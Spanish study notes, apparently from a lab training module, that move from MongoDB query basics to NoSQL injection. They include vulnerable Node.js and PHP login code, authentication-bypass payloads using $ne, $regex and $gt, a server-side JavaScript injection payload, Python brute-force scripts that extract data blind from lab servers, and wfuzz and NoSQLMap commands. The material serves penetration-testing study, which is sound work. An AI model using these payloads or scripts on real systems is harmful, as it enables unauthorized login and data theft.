# NoSQL Injection

## Diagrama SQL vs NoSQL

- [https://medium.com/tech-tajawal/nosql-modeling-database-structuring-part-ii-4c364c4bc17a](https://medium.com/tech-tajawal/nosql-modeling-database-structuring-part-ii-4c364c4bc17a)
	- [https://www.mongodb.com/docs/manual/reference/sql-comparison/?_ga=2.178884903.2019190669.1683400754-1607690844.1683400754](https://www.mongodb.com/docs/manual/reference/sql-comparison/?_ga=2.178884903.2019190669.1683400754-1607690844.1683400754)

## Tipos de Base de Datos No Relacionales

|**Tipo**|**Descripción**|**Los 3 mejores motores (a noviembre de 2022)**|
|:--------:|:--------:|:--------:|
|Document-Oriented Database| Almacena datos en `documents` que contienen pares de `fields` y `values`. Estos documentos suelen estar codificados en formatos como `JSON` o `XML`.|[MongoDB](https://www.mongodb.com/) , [Amazon DynamoDB](https://aws.amazon.com/dynamodb/) , [Google Firebase - Cloud Firestore](https://firebase.google.com/products/firestore/)|
|Key-Value Database|Una estructura de datos que almacena datos en pares `key:value`, también conocida como `dictionary`.|[Redis](https://redis.io/) , [Amazon DynamoDB](https://aws.amazon.com/dynamodb/) , [Azure Cosmos DB](https://azure.microsoft.com/en-us/products/cosmos-db/)|
|Wide-Column Store|Se utiliza para almacenar enormes cantidades de datos en `tables`, `rows`y `columns` como una base de datos relacional, pero con la capacidad de manejar tipos de datos más ambiguos.|[Apache Cassandra](https://cassandra.apache.org/_/index.html) , [Apache HBase](https://hbase.apache.org/) , [Azure Cosmos DB](https://azure.microsoft.com/en-us/products/cosmos-db/)|
|Graph Database|Almacena datos en `nodes` y los utiliza `edges` para definir relaciones.|[Neo4j](https://neo4j.com/) , [Azure Cosmos DB](https://azure.microsoft.com/en-us/products/cosmos-db/) , [Virtuoso](https://virtuoso.openlinksw.com/)|

## Interactuando con mongoDB

### Formato

 En `MongoDB`, estos `documents `están codificados en [BSON](https://bsonspec.org/) (Binary JSON). Un ejemplo de `document` que se puede almacenar en una `MongoDB` base de datos es:

```bash
{
  _id: ObjectId("63651456d18bf6c01b8eeae9"),
  type: 'Granny Smith',
  price: 0.65
}
```

### Conexion por consola

```bash
mongosh mongodb://127.0.0.1:27017
```

![[Pasted image 20230502112332.png]]

### Obtener las Bases de Datos actuales

```bash
show databases
```

![[Pasted image 20230502112354.png]]

### Crear Base de Datos

MongoDB no crea un archivo `database` hasta que primero almacene datos en ese archivo `database`. Podemos seleccionar la base de datos que queremos crear, por ejemplo si queremos crear la base de datos **academy** la seleccionamos:

```bash
use academy
```

#### Insertar valores

Esto no crea la base de datos como tal hasta que no insertemos informacion en ella, (creando la tabla **apples**)

```bash
#insertando un valor
db.apples.insertOne({type: "Granny Smith", price: 0.65})

#insertando varios valores al mismo tiempo
db.apples.insertMany([{type: "Golden Delicious", price: 0.79}, {type: "Pink Lady", price: 0.90}])
```

#### Listar tablas

```bash
show colections
```

#### Listar campos de una tabla

```bash
Object.keys(db.accounts.findOne())
```

#### Seleccionar datos

```bash
#select * from apples where type="Granny Smith"
db.apples.find({type: "Granny Smith"})

#select * from apples
db.apples.find({})
[
  {
    _id: ObjectId("63651456d18bf6c01b8eeae9"),
    type: 'Granny Smith',
    price: 0.65
  },
  {
    _id: ObjectId("6365147cd18bf6c01b8eeaea"),
    type: 'Golden Delicious',
    price: 0.79
  },
  {
    _id: ObjectId("6365147cd18bf6c01b8eeaeb"),
    type: 'Pink Lady',
    price: 0.90
  }
]
```

a traves de los operadores de comparacion, logicos y de evaluacion podemos crear consultas mas avanzadas:

|**Type**|**Operator**|**Description**|**Example**|
|:------:|:-------:|:-------:|:-------:|
|Comparación|`$eq`|Coincide con valores que son `equal to` a un valor especificado|`type: {$eq: "Pink Lady"}`|
|Comparación|`$gt`|Coincide con valores que son `greater than` a un valor especificado|`price: {$gt: 0.30}`|
|Comparación|`$gte`|Coincide con valores que son `greater than or equal to` a un valor especificado|`price: {$gte: 0.50}`|
|Comparación|`$in`|Coincide con los valores que existen `in the specified array`|`type: {$in: ["Granny Smith", "Pink Lady"]}`|
|Comparación|`$lt`|Coincide con valores que son `less than` a un valor especificado|`price: {$lt: 0.60}`|
|Comparación|`$lte`|Coincide con valores que son `less than or equal to` a un valor especificado|`price: {$lte: 0.75}`|
|Comparación|`$nin`|Coincide con valores que no son `not in the specified array`|`type: {$nin: ["Golden Delicious", "Granny Smith"]}`|
|Lógico|`$and`|Coincide con documentos que `meet the conditions of both` especificaron consultas|`$and: [{type: 'Granny Smith'}, {price: 0.65}]`|
|Lógico|`$not`|Coincide con los documentos que `do not meet the conditions` de una consulta específica|`type: {$not: {$eq: "Granny Smith"}}`|
|Lógico|`$nor`|Coincide con los documentos que `do not meet the conditions` de cualquiera de las consultas especificadas|`$nor: [{type: 'Granny Smith'}, {price: 0.79}]`|
|Lógico|`$or`|Coincide con los documentos que `meet the conditions of one` de las consultas especificadas|`$or: [{type: 'Granny Smith'}, {price: 0.79}]`|
|Evaluación|`$mod`| Coincide con valores que divididos por a `specific divisor` tienen el `specified remainder`|`price: {$mod: [4, 0]}`|
|Evaluación|`$regex`|Coincide con los valores que `match a specified RegEx`|`type: {$regex: /^G.*/}`|
|Evaluación|`$where`|Coincide con documentos que [satisfacen una expresión de JavaScript](https://www.mongodb.com/docs/manual/reference/operator/query/where/)|`$where: 'this.type.length === 9'`|

#### Ejemplos avanzados

>**_Seleccionar todas las manzanas cuyo `type` comience con una 'G' y cuyo `price` sea inferior a 0,70_**

```bash
db.apples.find({
    $and: [
        {
            type: {
                $regex: /^G/
            }
        },
        {
            price: {
                $lt: 0.70
            }
        }
    ]
});

#output
[
  {
    _id: ObjectId("63651456d18bf6c01b8eeae9"),
    type: 'Granny Smith',
    price: 0.65
  }
]
```

Alternativamente, podríamos usar el operador `$where` para obtener el mismo resultado:

```bash
db.apples.find({$where: `this.type.startsWith('G') && this.price < 0.70`});
```

>**_Hay exactamente un usuario cuyo primer nombre tiene 6 letras y comienza con una 'R', y cuyo apellido tiene 7 letras y comienza con una 'D'. ¿Cuál es la contraseña del usuario?_**

```bash
db.accounts.find({firstName: {$regex: /^R.{5}$/}, lastName: {$regex: /^D.{6}$/}})
db.accounts.find({$where: `this.firstName.startsWith('R') && this.firstName.length == 6 && this.lastName.startsWith('D') && this.lastName.length == 7`})
```

>**_Seleccionar el top 2 de apples en orden descendente_**

```bash
db.apples.find({}).sort({price: -1}).limit(2)
```

>[!note]
>Si quisiéramos invertir el orden de clasificación, usaríamos `1 (Ascending) `en lugar de `-1 (Descending)`. Tenga en cuenta el `.limit(2)` al final, que nos permite establecer un límite en la cantidad de resultados que se devolverán.

#### Obtener solo valores especificos

podemos ver todos los campos que tiene una tabla:

```bash
Object.keys(db.accounts.findOne())
```

![[Pasted image 20230502122018.png]]

si en nuestra consulta solo que remos obtener algunos de ellos y no todo podemos aplicar un filtro como segundo parametro en el `find()`:

para seleecionar el campo **password** solamente: (`{password:1}`)

```bash
db.accounts.find({firstName: {$regex: /^R.{5}/},lastName: {$regex: /^D.{6}/}},{password:1})
```

![[Pasted image 20230502122223.png]]

para seleecionar todos los campos menos el **password**:(`{password:0}`)

```bash
db.accounts.find({firstName: {$regex: /^R.{5}/},lastName: {$regex: /^D.{6}/}},{password:0})
```

![[Pasted image 20230502122329.png]]

#### Actualizar valores

Imagina que el precio las manzanas de `Granny Smith` ha subido de `0.65` a `1.99`debido a la inflación. Para actualizar el documento, haríamos esto:

```bash
db.apples.updateOne({type: "Granny Smith"}, {$set: {price: 1.99}})
```

Si queremos aumentar los precios de todas las manzanas al mismo tiempo, podríamos usar el operador `$inc` y hacer esto:

```bash
db.apples.updateMany({}, {$inc: {quantity: 1, "price": 1}})
```

#### Actualizar documento (tabla)

El `$set`operador nos permite actualizar campos específicos en un documento existente, pero si queremos reemplazar completamente el documento, podemos hacerlo así `replaceOne`:

```bash
db.apples.replaceOne({type:'Pink Lady'}, {name: 'Pink Lady', price: 0.99, color: 'Pink'})
```

#### Eliminar datos

Eliminar un documento es muy similar a seleccionar documentos. Pasamos una consulta y se eliminan los documentos coincidentes. Digamos que queríamos `eliminar apples que tienen su precio menor a 0.80`:

```bash
db.apples.remove({price: {$lt: 0.8}})
```

## Introduccion a NoSQL Injection

Si un atacante puede controlar parte de la consulta, puede subvertir la lógica y hacer que el servidor la lleve a cabo . Dado que NoSQL no tiene un lenguaje de consulta estandarizado como SQL , los ataques de inyección de NoSQL se ven diferentes en las diversas implementaciones de NoSQL.

Ejemplo de codigo vulnerable de una apliccion que usa NodeJS con Express y MongoDB:

```javascript
// Express is a Web-Framework for Node.JS
const express = require('express');
const app = express();
app.use(express.json()); // Tell Express to accept JSON request bodies

// MongoDB driver for Node.JS and the connection string
// for our local MongoDB database
const {MongoClient} = require('mongodb');
const uri = "mongodb://127.0.0.1:27017/test";
const client = new MongoClient(uri);

// POST /api/v1/getUser
// Input (JSON): {"username": <username>}
// Returns: User details where username=<username>
app.post('/api/v1/getUser', (req, res) => {
    client.connect(function(_, con) {
        const cursor = con
            .db("example")
            .collection("users")
            .find({username: req.body['username']});
        cursor.toArray(function(_, result) {
            res.send(result);
        });
    });
});

// Tell Express to start our server and listen on port 3000
app.listen(3000, () => {
  console.log(`Listening...`);
});
```

El problema es que el servidor usa ciegamente lo que le damos como consulta de nombre de usuario sin filtros ni controles. A continuación se muestra un ejemplo de código que es vulnerable a `NoSQL injection`:

```javascript
.find({username: req.body['username']});
```

## Tipos de inyección NoSQL

Si está familiarizado con la inyección de SQL, ya estará familiarizado con las diversas clases de inyecciones que podemos encontrar:

- `In-Band`: Cuando el atacante puede usar el mismo canal de comunicación para explotar una inyección NoSQL y recibir los resultados. El escenario de arriba es un ejemplo de esto.
- `Blind`: Aquí es cuando el atacante no recibe ningún resultado directo de la inyección de NoSQL, pero puede inferir resultados en función de cómo responde el servidor.
- `Boolean`: La basada en booleanos es una subclase de inyecciones ciegas, que es una técnica en la que los atacantes pueden obligar al servidor a evaluar una consulta y devolver un resultado u otro si es Verdadero o Falso.
- `Time-Based`: La basada en el tiempo es la otra subclase de inyecciones ciegas, que es cuando los atacantes hacen que el servidor espere una cantidad específica de tiempo antes de responder, generalmente para indicar si la consulta se evalúa como verdadera o falsa.

## Explotacion

### Bypass Authentication

Por ejemplo, una pagina de inicio de sesion basada en PHP con MongoDB llamada **MongoMail** tiene el siguiente codigo:

```php
if ($_SERVER['REQUEST_METHOD'] === "POST"):
    if (!isset($_POST['email'])) die("Missing `email` parameter");
    if (!isset($_POST['password'])) die("Missing `password` parameter");
    if (empty($_POST['email'])) die("`email` can not be empty");
    if (empty($_POST['password'])) die("`password` can not be empty");

    $manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
    $query = new MongoDB\Driver\Query(array("email" => $_POST['email'], "password" => $_POST['password']));
    $cursor = $manager->executeQuery('mangomail.users', $query);
        
    if (count($cursor->toArray()) > 0) {
```

Podemos ver que el servidor verifica si `email` y `password` están dados y no vacíos antes de hacer algo con ellos. Una vez que se verifica, se conecta a una instancia de MongoDB que se ejecuta localmente y luego consulta `mangomail` para ver si hay un usuario con el par dado de `email` y `password`, así:

```javascript
db.users.find({
    email: "<email>",
    password: "<password>"
});
```

El problema es que ambos `email`y `username` son entradas controladas por el usuario, que se pasan `unsanitized` a una query de MongoDB . Esto significa que nosotros (como atacantes) podemos realizar un bypass del control.

Al final del codigo realiza una validacion si es que la consulta devuelve algun registro, no importa cual sea. Por lo que si hacemos que devuelva uno o mas (`>0`) registros se puede hacer un bypass de la autenticacion.

Por ahora, queremos que esta consulta arroje una coincidencia en cualquier documento porque esto dará como resultado que se nos autentique como quien coincida. Una forma sencilla de hacer esto sería usar el operador `$ne` de consulta en ambos `email` y `password` **y hacer coincidir los valores que son `not equal` con algo que sabemos que no existe.**

**_Para ponerlo en palabras, queremos una consulta que coincida con `email no es igual a 'test@test.com' y password no es igual a 'test'`._**

```javascript
db.users.find({
    email: {$ne: "test@test.com"},
    password: {$ne: "test"}
});
```

>[!tip]
>Si los parametros son codificados en URL como en el caso de PHP debemos pasar los parametros de la siguiente manera:
>
>- `param[$op]=val` es lo mismo que `param: {$op: val}`
> ```http
> email[$ne]=test@test.com&password[$ne]=test
> ```

#### Mas Payloads

hacer coincidir con algo que no existe:

```javascript
db.users.find({
    email: {$ne: "test@test.com"},
    password: {$ne: "test"}
});
```

significa que cualquier carácter se repite 0 o más veces y, por lo tanto, coincide con todo:

```javascript
db.users.find({
    email: {$regex: /.*/},
    password: {$regex: /.*/}
});
```

Esto supone que conocemos el correo electrónico del administrador y queremos dirigirnos directamente a él:

```javascript
db.users.find({
    email: "admin@admin.com",
    password: {$ne: "x"}
});
```

Cualquier cadena es 'mayor que' una cadena vacía:

```javascript
db.users.find({
    email: {$gt: },
    password: {$gt: }
});
```

```javascript
db.users.find({
    email: {$gte: },
    password: {$gte: }
});
```

![[Pasted image 20230502150524.png]]

### In-Band data extraction

Este viene a ser el SQL injection tradicional en donde obtenemos mas informacion de la que deberiamos ver. 

>[!note]
>**las vulnerabilidades de extracción de datos en banda a menudo pueden llevar a que se exfiltre toda la base de datos. En `MongoDB`, sin embargo, dado que es una `non-relational` base de datos y las consultas se realizan en `specific collections`, los ataques (generalmente) se limitan a la colección a la que se aplica la inyección.**

una aplicacion permite la busqueda de infomacion y tiene la siguiente logica:

```javascript
db.types.find({
    name: $_GET['q']
});
```

Queremos enumerar información para todos los tipos en la colección, y suponiendo que nuestra suposición de cómo el back-end maneja nuestra entrada es correcta, podemos usar una consulta **RegEx** que coincidirá con todo como esto:

```javascript
db.types.find({
    name: {$regex: /.*/}
});
```

esto nos retornaria todos los registros.

#### Mas Payloads

Regex que coincide con todo:

```javascript
db.types.find({
    name: {$regex: /.*/}
});
```

hacer que no coincida on algo que no existe

```javascript
db.types.find({
    name: {$ne: 'doesntExist'}
});
```

mas grande que una cadena vacia:

```javascript
db.types.find({
    name: {$gt: ''}
});
```

```javascript
db.types.find({
    name: {$gte: ''}
});
```

Esto compara el primer carácter de `name` con un carácter Tilda y coincide si es 'menos'. Esto no siempre funcionará, pero funciona en este caso porque Tilda es el [valor ASCII imprimible más grande](https://www.asciitable.com/) y sabemos que todos los nombres de la colección están compuestos por caracteres ASCII.

```javascript
db.types.find({
    name: {$lt: '~'}
});
```

```javascript
db.types.find({
    name: {$lte: '~'}
});
```

**_Caso de uso:_**

![[Pasted image 20230502152629.png]]

![[Pasted image 20230502152714.png]]

![[Pasted image 20230502152731.png]]

### Blind Data Extraction

Una pagina realiza el tracking de paquetes a travez del codigo de envio, si la query es valida o retorna algun registro devuelve un mensaje, caso contrario devuleve un mensaje de advertencia.

![[Pasted image 20230502161029.png]]

Podemos abusar esto usando el operador **regex** para adivinar, en este caso, el codigo de envio. La informacion en este caso esta siendo enviada en formato **JSON**:

![[Pasted image 20230502161151.png]]

y tiene la siguiente logica en el backend:

```javascript
db.tracking.find({
    trackingNum: <trackingNum from JSON>
});
```

vemos que si enviamos un codigo que no existe bota el siguiente mensaje: `This tracking number does not exist`, no sabemos cual es la longitud del codigo ni cual es, pero a traves del operador **regex** podemos ir fuzzeando uno por uno los caracteres:

podemos preguntar si el codigo empieza con el numero **2**:

```json
{"trackingNum":{"$regex":"^2.*"
}}
```

![[Pasted image 20230502161727.png]]

vemos que no empieza con **2**, pero si cambiamos a **3** para ver si comienza con ese numero:

```json
{"trackingNum":{"$regex":"^3.*"
}}
```

![[Pasted image 20230502161850.png]]

vemos que devuelve otro mensaje, lo que da a entender que ese caracter es correcto.

Podemos hacer esto para todos los caracteres que tiene el codigo hasta que veamos que devuelve otro mensaje con el rastreo del codigo encontrado.

podemos hacer esto con el **intruder**:

![[Pasted image 20230502162225.png]]

#### Automating Script

```python
#!/usr/bin/python3

import requests
import json
from pwn import *


# make request
def request(t):
    r = requests.post(
        "http://138.68.170.86:32408/index.php",
        headers = {"Content-Type": "application/json"},
        data = json.dumps({"trackingNum": t})
    )
    return "Franz" in r.text #part of success response

# Dump the tracking number
trackingNum = "" # Tracking number 
p1 = log.progress("Tracking code discover")
for _ in range(8): # Repeat the following 8 times
    for c in "0123456789A": # Loop through characters [0-9a-f]
        
        # Check if <trackingNum> + <char> matches with $regex
        if request({"$regex": "^" + trackingNum + c}): 
            trackingNum += c # If it does, append character to trackingNum ...
            break # ... and break out of the loop
    p1.status(trackingNum)

print("Tracking Number: " + trackingNum)
```

![[Pasted image 20230502172142.png]]

logica para descubrir la bandera

```python
#!/usr/bin/python3

import requests
import json
from pwn import *


# make request
def request(t):
    r = requests.post(
        "http://138.68.170.86:32408/index.php",
        headers = {"Content-Type": "application/json"},
        data = json.dumps({"trackingNum": t})
    )
    return "bmdyy" in r.text #part of success response

# Dump the tracking number
trackingNum = "HTB{" # Tracking number 
p1 = log.progress("Tracking code discover")
for _ in range(32): # Repeat the following 8 times
    for c in "0123456789abcdef": # Loop through characters [0-9a-f]
        
        # Check if <trackingNum> + <char> matches with $regex
        if request({"$regex": "^" + trackingNum + c}): 
            trackingNum += c # If it does, append character to trackingNum ...
            break # ... and break out of the loop
    p1.status(trackingNum)

trackingNum += "}"
print("Tracking Number: " + trackingNum)
```

![[Pasted image 20230502172545.png]]

## Server Side Javascript Injection (SSJI)

Un tipo de inyección exclusivo de NoSQL es `JavaScript Injection`. Aquí es cuando un atacante puede hacer que el servidor ejecute JavaScript arbitrario en el contexto de la base de datos. La inyección de JavaScript puede, por supuesto, ser en banda, ciega o fuera de banda, según el escenario.

Un ejemplo rápido de esto sería un servidor que utilizó la `$where` consulta para verificar las combinaciones de nombre de usuario/contraseña:

```javascript
...
.find({$where: "this.username == \"" + req.body['username'] + "\" && this.password == \"" + req.body['password'] + "\""});
...
```

el operador `$where` admite **string Javascript** o **funcion Javascript** para una evaluacion en la consulta:

![[Pasted image 20230502173635.png]]

- [https://www.mongodb.com/docs/manual/reference/operator/query/where/](https://www.mongodb.com/docs/manual/reference/operator/query/where/)

ejemplo con funcion:

```javascript
...
.find({$where: function(){return (this.username==this.password)}});
...
```

como la entrada del usuario se concatena a la consulta sin sanitizarla, podriamos colocar un payload como este para evadir la autenticacion:

```javascript
" || true || ""=="
```

dejando la consulta asi:

```javascript
db.users.find({$where: 'this.username == "" || true || ""=="" && this.password == "" || true || ""==""'})
```

retornando `True` y evadiendo la autenticacion. Como es codigo JS podemos probar desde la consola del navegador:

![[Pasted image 20230502174916.png]]

con el payload vemos que hacemos cambiar el resultado del codigo Javascript.

### Blind Data Extraction

Al igual que en **NoSQL Injection** podemos descubrir informacion a traves del siguiente payload y fuzzear con intruder:

```javascript
" || (this.username.match('^.*')) || ""=="
```

A continuación, podemos comenzar a adivinar cuál es el primer carácter del nombre de usuario con cargas útiles como: `" || (this.username.match('^a.*')) || ""=="`. Si no existe tal nombre de usuario, como es el caso de `^a.*`, la aplicación no podrá iniciar sesión.

usando intruder:

![[Pasted image 20230502215530.png]]

#### Automating Script

```python
#!/usr/bin/python3

import requests
import json
from pwn import *


# make request
def request(username,c):
    r = requests.post(
        "http://206.189.114.209:32278/index.php",
        headers = {"Content-Type": "application/x-www-form-urlencoded"},
        data = "username=chris%22+||+(this.username.match('^"+username+""+c+".*'))+||+%22%22%3d%3d%22&password=123"
    )
    return "Logged in as" in r.text #part of success response

# Dump the tracking number
username = "HTB{" # Tracking number 
p1 = log.progress("username discover")
p2 = log.progress("character")
for _ in range(32): # Repeat the following 8 times
    for c in "0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM!'·$/()=_,-": 
        p2.status(c)
        # Check if <trackingNum> + <char> matches with $regex
        if request(username,c): 
            username += c # If it does, append character to trackingNum ...
            break # ... and break out of the loop
    p1.status(username)
username += "}"
print("Username: " + username)
```

![[Pasted image 20230502230404.png]]

## Diccionarios para fuzzing

La eficacia del fuzzing depende en gran medida de la elección de la lista de palabras. Desafortunadamente para NoSQL, no hay muchas listas de palabras públicas, pero aquí hay un par:

-  [seclists/Fuzzing/Bases de datos/NoSQL.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/NoSQL.txt)
-  [nosqlinjection_wordlists/mongodb_nosqli.txt](https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt)

```bash
wfuzz -z file,/usr/share/seclists/Fuzzing/Databases/NoSQL.txt -u http://127.0.0.1/index.php -d '{"trackingNum": FUZZ}'
```

![[Pasted image 20230502225132.png]]

## Herramientas

### NoSQLMap

[NoSQLmap](https://github.com/codingo/NoSQLMap) es una herramienta Python 2 de código abierto para identificar vulnerabilidades de inyección de NoSQL. Podemos instalarlo ejecutando los siguientes comandos (el contenedor [Docker](https://github.com/codingo/NoSQLMap/tree/master/docker) parece no funcionar).

```bash
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
sudo apt install python2.7
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python2 get-pip.py
pip2 install couchdb
pip2 install --upgrade setuptools
pip2 install pbkdf2
pip2 install pymongo
pip2 install ipcalc
```

Imagine que sabemos que el correo electrónico del administrador es `admin\@mangomail.com`, y queremos probar si el `password`campo es vulnerable a la inyección de NoSQL. Para probar eso, podemos ejecutar **NoSQLMap** con los siguientes argumentos:

```bash
python2 nosqlmap.py --attack 2 --victim 127.0.0.1 --webPort 80 --uri /index.php --httpMethod POST --postData email,admin@mangomail.com,password,qwerty --injectedParameter 1 --injectSize 4
```

-   `--attack 2` para especificar un`Web attack`
-   `--victim 127.0.0.1` para especificar la dirección IP
-   `--webPort 80` para especificar el puerto
-   `--uri /index.php` para especificar la URL a la que queremos enviar solicitudes
-   `--httpMethod POST` para especificar que queremos enviar solicitudes POST
-   `--postData email,admin@mangomail.com,password,qwerty` para especificar los dos parámetros `email`y `password`que queremos enviar con los valores predeterminados `admin\@mangomail.com` y `qwerty` respectivamente
-   `--injectedParameter 1` para especificar que queremos probar el `password`parámetro
-   `--injectSize 4` para especificar un tamaño predeterminado para los datos generados aleatoriamente

![[Pasted image 20230502231245.png]]

![[Pasted image 20230502231300.png]]


